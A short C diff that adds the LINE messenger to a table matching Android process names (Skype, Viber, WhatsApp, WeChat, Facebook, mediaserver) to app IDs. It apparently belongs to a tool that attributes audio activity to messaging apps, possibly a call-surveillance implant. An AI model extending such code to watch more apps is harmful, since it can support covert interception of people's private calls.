@@ -87,6 +87,7 @@ char local_started=0;
 #define PRG_UNKNOWN_ID 0x0
 #define PRG_SKYPE_ID 0x0146
 #define PRG_VIBER_ID 0x0148
+#define PRG_LINE_ID 0x014a
 #define PRG_WHATSAPP_ID 0x014b
 #define PRG_WECHAT_ID 0x0149
 #define PRG_FB_ID 0x014c
@@ -100,6 +101,7 @@ enum{
 	POS_WHATSAPP,
 	POS_WECHAT,
 	POS_FACEBOOK,
+	POS_LINE,
 	POS_MEDIA,
 	POS_RET,
 	POS_MAX
@@ -111,6 +113,7 @@ const char *pid_name[]={
 		"com.whatsapp",
 		"com.tencent.mm",
 		"com.facebook.",
+		"jp.naver.line.android",
 		"/system/bin/mediaserver",
 		"unknown"
 };
@@ -173,6 +176,10 @@ int get_command_id(int pid) {
 			   last_pid_lookup[POS_FACEBOOK] = pid;
 			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_FACEBOOK] = PRG_FB_ID;
 			   last_found=POS_FACEBOOK;
+			}else  if(strncmp(cmdline, pid_name[POS_LINE],21) == 0) {
+                           last_pid_lookup[POS_LINE] = pid;
+                           last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_LINE] = PRG_LINE_ID;
+                           last_found=POS_LINE;
 			}else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
 			   last_pid_lookup[POS_MEDIA] = pid;
 			   last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
